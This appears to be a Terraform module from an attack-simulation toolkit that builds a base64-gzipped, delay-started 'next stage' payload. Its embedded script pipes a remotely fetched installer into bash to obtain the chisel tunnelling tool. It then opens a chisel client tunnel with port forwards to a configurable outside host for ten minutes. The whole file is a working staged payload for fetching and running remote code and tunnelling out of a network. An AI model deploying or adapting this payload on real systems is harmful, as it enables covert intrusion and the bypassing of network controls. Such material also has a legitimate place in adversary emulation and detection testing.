locals {
    host_ip = var.inputs["host_ip"]
    host_port = var.inputs["host_port"]
    #9001:www.exploit-db.com:443
    port_forwards = join(" ", [
        for port in var.inputs["port_forwards"]: "${port.src_port}:${port.dst_ip}:${port.dst_port}"
    ])
    payload = <<-EOT
    killall -9 chisel
    truncate -s 0 /tmp/chisel.log
    log "checking for chisel..."
    while ! command -v chisel; do
        log "chisel not found - installing"
        curl https://i.jpillora.com/chisel! | bash
        sleep 10
    done
    log "chisel: $(command -v  chisel)"
    /usr/local/bin/chisel client -v ${local.host_ip}:${local.host_port} ${local.port_forwards} > /tmp/chisel.log 2>&1 &
    log "waiting 10 minutes..."
    sleep 600
    log "wait done - terminating"
    killall -9 chisel
    log "done"
    EOT

    base64_payload = base64gzip(templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
        script_name = basename(path.module)
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = ""
        apt_post_tasks = ""
        yum_pre_tasks =  ""
        yum_packages = ""
        yum_post_tasks = ""
        script_delay_secs = 30
        next_stage_payload = local.payload
    }}))

    outputs = {
        base64_payload = local.base64_payload
    }
}